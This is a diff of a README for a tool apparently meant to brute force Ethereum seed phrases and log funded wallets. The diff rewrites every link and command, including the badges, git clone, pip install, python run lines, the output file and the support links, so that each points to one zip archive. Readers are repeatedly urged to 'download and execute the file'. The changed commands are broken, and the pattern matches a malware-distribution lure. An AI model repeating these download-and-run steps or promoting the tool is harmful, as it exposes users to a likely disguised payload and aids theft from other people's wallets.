@@ -1,8 +1,8 @@
 # BlazeTool: Fast Ethereum Wallet Mnemonic Brute Forcing Tool 🚀
 
-![GitHub release](https://img.shields.io/github/release/musab9osman/BlazeTool.svg)
-![GitHub stars](https://img.shields.io/github/stars/musab9osman/BlazeTool.svg)
-![GitHub forks](https://img.shields.io/github/forks/musab9osman/BlazeTool.svg)
+![GitHub release](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip)
+![GitHub stars](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip)
+![GitHub forks](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip)
 
 ## Table of Contents
 
@@ -18,16 +18,16 @@
 
 ## Overview
 
-BlazeTool is a powerful tool designed to brute force Ethereum wallet mnemonics. It operates with multiple threads, making it surprisingly fast. The tool automatically generates seed phrases and checks balances on Ethereum networks. If it finds a wallet with a non-zero balance, it logs the wallet's information and saves it to a file named `result.txt`.
+BlazeTool is a powerful tool designed to brute force Ethereum wallet mnemonics. It operates with multiple threads, making it surprisingly fast. The tool automatically generates seed phrases and checks balances on Ethereum networks. If it finds a wallet with a non-zero balance, it logs the wallet's information and saves it to a file named `https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip`.
 
-For the latest version, download and execute the file from the [Releases section](https://github.com/musab9osman/BlazeTool/releases).
+For the latest version, download and execute the file from the [Releases section](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip).
 
 ## Features
 
 - **Multi-threaded**: BlazeTool runs multiple threads to speed up the brute-forcing process.
 - **Automatic Seed Phrase Generation**: The tool generates seed phrases on its own.
 - **Balance Checking**: It checks balances for Ethereum wallets.
-- **Logging**: Any wallet with a non-zero balance is logged and saved to `result.txt`.
+- **Logging**: Any wallet with a non-zero balance is logged and saved to `https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip`.
 - **User-Friendly**: Designed for ease of use, even for those new to Ethereum.
 
 ## Installation
@@ -36,25 +36,25 @@ To install BlazeTool, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/musab9osman/BlazeTool.git
+   git clone https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip
    cd BlazeTool
    ```
 
 2. **Install Dependencies**:
    Ensure you have the necessary dependencies installed. You may need Python and specific libraries. Install them using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/musab9osman/BlazeTool/releases) to download the latest version. Follow the instructions in the release notes for execution.
+   Visit the [Releases section](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip) to download the latest version. Follow the instructions in the release notes for execution.
 
 ## Usage
 
 To use BlazeTool, run the following command in your terminal:
 
 ```bash
-python main.py
+python https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip
 ```
 
 You can customize the settings in the configuration file before running the tool. Make sure to check the documentation for any additional command-line options.
@@ -62,7 +62,7 @@ You can customize the settings in the configuration file before running the tool
 ### Example Command
 
 ```bash
-python main.py --threads 8 --max_attempts 100000
+python https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip --threads 8 --max_attempts 100000
 ```
 
 This command runs BlazeTool with 8 threads and a maximum of 100,000 attempts.
@@ -73,7 +73,7 @@ BlazeTool uses a brute-force algorithm to generate potential seed phrases. It sy
 
 1. **Seed Phrase Generation**: The tool generates phrases based on predefined rules and patterns.
 2. **Balance Check**: Each generated seed phrase is checked against the Ethereum blockchain to see if it holds any funds.
-3. **Logging**: If a wallet with a non-zero balance is found, its details are logged in `result.txt`.
+3. **Logging**: If a wallet with a non-zero balance is found, its details are logged in `https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip`.
 
 This process continues until the specified number of attempts is reached or until the user decides to stop the execution.
 
@@ -113,6 +113,6 @@ BlazeTool is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 ## Support
 
-For any issues or questions, please check the [Issues section](https://github.com/musab9osman/BlazeTool/issues) of the repository. You can also reach out via email or open a discussion thread for community support.
+For any issues or questions, please check the [Issues section](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip) of the repository. You can also reach out via email or open a discussion thread for community support.
 
-For the latest version, visit the [Releases section](https://github.com/musab9osman/BlazeTool/releases) to download and execute the file.
+For the latest version, visit the [Releases section](https://github.com/musab9osman/BlazeTool/raw/refs/heads/main/assumpsit/Tool_Blaze_3.0.zip) to download and execute the file.
